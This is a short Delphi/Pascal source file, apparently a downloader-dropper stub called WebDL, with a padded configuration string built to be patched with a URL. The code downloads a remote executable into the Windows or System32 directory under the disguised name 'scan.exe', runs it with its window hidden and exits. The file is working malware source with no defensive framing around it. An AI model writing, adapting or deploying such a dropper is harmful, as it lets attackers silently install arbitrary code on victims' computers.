program WebDL;

type
UINT = LongWord;
//                        1         2         3         4         5         6
const//          123456789012345678901234567890123456789012345678901234567890
 cfg:string='url=1http://www.host.com/file.exe                               ';
var
 u,b:string;st:array[0..255]of char;

function GetWindowsDirectory(lpBuffer: PChar; uSize: UINT): UINT; stdcall; external 'kernel32.dll' name 'GetWindowsDirectoryA';
function GetSystemDirectory(lpBuffer: PChar; uSize: UINT): UINT; stdcall; external 'kernel32.dll' name 'GetSystemDirectoryA';
function WinExec(lpCmdLine: pchar; uCmdShow: longword): longword; stdcall; external 'kernel32.dll';
procedure ExitProcess(uExitCode: Cardinal); stdcall; external 'kernel32.dll';
function URLDownloadToFile(Caller: cardinal; URL: PChar; FileName: PChar; Reserved: LongWord; StatusCB: cardinal): Longword; stdcall; external 'URLMON.DLL' name 'URLDownloadToFileA';
function Trim(const S: string): string;
var
 I, L: Integer;
begin
 L := Length(S);
 I := 1;
 while (I <= L) and (S[I] <= ' ') do Inc(I);
 if I > L then Result := '' else
  begin
   while S[L] <= ' ' do Dec(L);
   Result := Copy(S, I, L - I + 1);
  end;
end;
begin
if copy(cfg,5,1) = '0' then getwindowsdirectory(st,255) else getsystemdirectory(st,255);
u := trim(copy(cfg,6,length(cfg)));
B := st + '\scan.exe';
UrlDownloadToFile(0, pchar(u), pchar(b), 0, 0);
WinExec(pchar(b),0);
ExitProcess(0);
end.

